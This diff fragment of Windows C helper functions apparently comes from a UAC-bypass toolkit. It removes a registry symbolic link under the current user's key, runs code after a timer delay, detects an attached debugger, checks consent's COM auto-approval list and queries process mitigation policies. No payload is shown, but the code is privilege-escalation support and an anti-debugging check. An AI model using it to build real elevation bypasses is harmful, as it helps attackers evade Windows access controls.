+}
+
+/*
+* supRemoveRegLinkHKCU
+*
+* Purpose:
+*
+* Remove registry symlink for current user.
+*
+*/
+NTSTATUS supRemoveRegLinkHKCU(
+    VOID
+)
+{
+    BOOL bCond = FALSE;
+    NTSTATUS status = STATUS_UNSUCCESSFUL;
+
+    ULONG cbKureND = sizeof(T_SYMLINK) - sizeof(WCHAR);
+
+    UNICODE_STRING usCurrentUser, usLinkPath;
+    OBJECT_ATTRIBUTES obja;
+    UNICODE_STRING CmSymbolicLinkValue = RTL_CONSTANT_STRING(L"SymbolicLinkValue");
+
+    HANDLE hHeap = NtCurrentPeb()->ProcessHeap;
+
+    PWSTR lpLinkKeyBuffer = NULL;
+    SIZE_T memIO;
+
+    HANDLE hKey = NULL;
+
+    InitializeObjectAttributes(&obja, &usLinkPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+    status = RtlFormatCurrentUserKeyPath(&usCurrentUser);
+    if (!NT_SUCCESS(status))
+        return status;
+
+    do {
+
+        memIO = sizeof(UNICODE_NULL) + usCurrentUser.MaximumLength + cbKureND;
+        lpLinkKeyBuffer = RtlAllocateHeap(hHeap, HEAP_ZERO_MEMORY, memIO);
+        if (lpLinkKeyBuffer == NULL)
+            break;
+
+        usLinkPath.Buffer = lpLinkKeyBuffer;
+        usLinkPath.Length = 0;
+        usLinkPath.MaximumLength = (USHORT)memIO;
+
+        status = RtlAppendUnicodeStringToString(&usLinkPath, &usCurrentUser);
+        if (!NT_SUCCESS(status))
+            break;
+
+        status = RtlAppendUnicodeToString(&usLinkPath, T_SYMLINK);
+        if (!NT_SUCCESS(status))
+            break;
+
+        InitializeObjectAttributes(&obja, &usLinkPath, OBJ_CASE_INSENSITIVE | OBJ_OPENLINK, NULL, NULL);
+
+        status = NtOpenKey(&hKey,
+            KEY_ALL_ACCESS,
+            &obja);
+
+        if (NT_SUCCESS(status)) {
+
+            status = NtDeleteValueKey(hKey, &CmSymbolicLinkValue);
+            if (NT_SUCCESS(status))
+                status = NtDeleteKey(hKey);
+
+            NtClose(hKey);
+        }
+
+    } while (bCond);
+
+    if (lpLinkKeyBuffer) RtlFreeHeap(hHeap, 0, lpLinkKeyBuffer);
+    RtlFreeUnicodeString(&usCurrentUser);
+
+    return status;
+}
+
+/*
+* supExecuteWithDelay
+*
+* Purpose:
+*
+* Delayed procedure execution.
+*
+*/
+BOOL supExecuteWithDelay(
+    _In_ ULONG Milliseconds,
+    _In_opt_ PTIMER_APC_ROUTINE CompletionRoutine,
+    _In_opt_ PVOID CompletionParameter
+)
+{
+    BOOL bResult = FALSE;
+    HANDLE hTimer = NULL;
+    LARGE_INTEGER liDueTime; 
+    OBJECT_ATTRIBUTES obja;
+
+    liDueTime.QuadPart = -(LONGLONG)UInt32x32To64(Milliseconds, 10000);
+
+    InitializeObjectAttributes(&obja, NULL, 0, NULL, NULL);
+    
+    if (NT_SUCCESS(NtCreateTimer(&hTimer,
+        TIMER_ALL_ACCESS,
+        &obja,
+        NotificationTimer))) 
+    {
+        if (NT_SUCCESS(NtSetTimer(
+            hTimer,
+            &liDueTime,
+            CompletionRoutine,
+            CompletionParameter,
+            FALSE,
+            0,
+            NULL)))
+        {
+            liDueTime.QuadPart = 0x8000000000000000; //INFINITE
+            bResult = (NT_SUCCESS(NtWaitForSingleObject(hTimer, FALSE, &liDueTime)));
+        }
+        NtClose(hTimer);
+    }
+    return bResult;
+}
+
+/*
+* supIsConsentApprovedInterface
+*
+* Purpose:
+*
+* Test if the given interface is in consent COMAutoApprovalList.
+*
+*/
+_Success_(return != FALSE)
+BOOL supIsConsentApprovedInterface(
+    _In_ LPWSTR InterfaceName,
+    _Out_ PBOOL IsApproved
+)
+{
+    BOOL                bResult = FALSE;
+
+    UNICODE_STRING      usKey = RTL_CONSTANT_STRING(T_COMAUTOAPPROVALLIST);
+    OBJECT_ATTRIBUTES   obja;
+    NTSTATUS            status = STATUS_UNSUCCESSFUL;
+    ULONG               dummy;
+
+    HKEY                hKey = NULL;
+
+    ULONG               Index = 0;
+
+    BYTE               *Buffer;
+    ULONG               Size = 0x1000;
+
+    PKEY_VALUE_BASIC_INFORMATION ValueInformation;
+
+    UNICODE_STRING      usKeyName, usInterfaceName;
+
+    InitializeObjectAttributes(&obja, &usKey, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+    bResult = NT_SUCCESS(NtOpenKey(
+        &hKey,
+        KEY_QUERY_VALUE,
+        &obja));
+
+    if (bResult) {
+
+        RtlInitUnicodeString(&usInterfaceName, InterfaceName);
+
+        Buffer = (BYTE*)_alloca(Size);
+        ValueInformation = (PKEY_VALUE_BASIC_INFORMATION)Buffer;
+
+        do {
+
+            status = NtEnumerateValueKey(
+                hKey,
+                Index,
+                KeyValueBasicInformation,
+                ValueInformation,
+                Size,
+                &dummy);
+
+            if (NT_SUCCESS(status)) {
+
+                usKeyName.MaximumLength = (USHORT)ValueInformation->NameLength;
+                usKeyName.Buffer = ValueInformation->Name;
+                usKeyName.Length = (USHORT)ValueInformation->NameLength;
+
+                if (RtlEqualUnicodeString(&usInterfaceName, &usKeyName, TRUE)) {
+                    *IsApproved = TRUE;
+                    break;
+                }
+                Index++;
+            }
+            else
+                break;
+
+        } while (status != STATUS_NO_MORE_ENTRIES);
+
+        NtClose(hKey);
+    }
+
+    return bResult;
+}
+
+/*
+* supIsDebugPortPresent
+*
+* Purpose:
+*
+* Return TRUE if current process has debug port FALSE otherwise.
+*
+*/
+BOOL supIsDebugPortPresent(
+    VOID
+)
+{
+    DWORD_PTR DebugPortPresent = 0, dwBuffer = 0;
+
+    if (NT_SUCCESS(NtQueryInformationProcess(
+        NtCurrentProcess(),
+        ProcessDebugPort,
+        &dwBuffer,
+        sizeof(dwBuffer),
+        NULL)))
+    {
+        DebugPortPresent = (dwBuffer != 0);
+    }
+
+    return (DebugPortPresent == 1);
+}
+
+
+/*
+* supGetProcessMitigationPolicy
+*
+* Purpose:
+*
+* Request process mitigation policy values.
+*
+*/
+BOOL supGetProcessMitigationPolicy(
+    _In_ HANDLE hProcess,
+    _In_ PROCESS_MITIGATION_POLICY Policy,
+    _In_ SIZE_T Size,
+    _Out_writes_bytes_(Size) PVOID Buffer
+)
+{
+    ULONG Length = 0;
+
+    PROCESS_MITIGATION_POLICY_INFORMATION MitigationPolicy;
+
+    MitigationPolicy.Policy = (PROCESS_MITIGATION_POLICY)Policy;
+
+    if (!NT_SUCCESS(NtQueryInformationProcess(
+        hProcess,
+        ProcessMitigationPolicy,
+        &MitigationPolicy,
+        sizeof(PROCESS_MITIGATION_POLICY_INFORMATION),
+        &Length)))
+    {
+        return FALSE;
+    }
+
+    RtlCopyMemory(Buffer, &MitigationPolicy, Size);
+
+    return TRUE;
+}
+
+/*
+* supGetRemoteCodeExecPolicies
+*
+* Purpose:
+*
+* Request specific process mitigation policy values all at once.
+* Use RtlFreeHeap to release returned buffer.
+*
+*/
+UCM_PROCESS_MITIGATION_POLICIES *supGetRemoteCodeExecPolicies(
+    _In_ HANDLE hProcess
+)
+{
+    UCM_PROCESS_MITIGATION_POLICIES *Policies = NULL;
+
+    Policies = RtlAllocateHeap(
+        NtCurrentPeb()->ProcessHeap,
+        HEAP_ZERO_MEMORY,
+        sizeof(UCM_PROCESS_MITIGATION_POLICIES));
+
+    if (Policies == NULL)
+        return NULL;
+
+    supGetProcessMitigationPolicy(
+        hProcess,
+        ProcessExtensionPointDisablePolicy,
+        sizeof(PROCESS_MITIGATION_EXTENSION_POINT_DISABLE_POLICY),
+        &Policies->ExtensionPointDisablePolicy);
+
+    supGetProcessMitigationPolicy(
+        hProcess,
+        ProcessSignaturePolicy,
+        sizeof(PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY_W10),
+        &Policies->SignaturePolicy);
+
+    supGetProcessMitigationPolicy(
+        hProcess,
+        ProcessDynamicCodePolicy,
+        sizeof(PROCESS_MITIGATION_DYNAMIC_CODE_POLICY_W10),
+        &Policies->DynamicCodePolicy);
+
+    supGetProcessMitigationPolicy(
+        hProcess,
+        ProcessImageLoadPolicy,
+        sizeof(PROCESS_MITIGATION_IMAGE_LOAD_POLICY_W10),
+        &Policies->ImageLoadPolicy);
+
+    supGetProcessMitigationPolicy(
+        hProcess,
+        ProcessSystemCallFilterPolicy,
+        sizeof(PROCESS_MITIGATION_SYSTEM_CALL_FILTER_POLICY_W10),
+        &Policies->SystemCallFilterPolicy);
+
+    supGetProcessMitigationPolicy(
+        hProcess,
+        ProcessPayloadRestrictionPolicy,
+        sizeof(PROCESS_MITIGATION_PAYLOAD_RESTRICTION_POLICY_W10),
+        &Policies->PayloadRestrictionPolicy);
+
+    return Policies;
 }
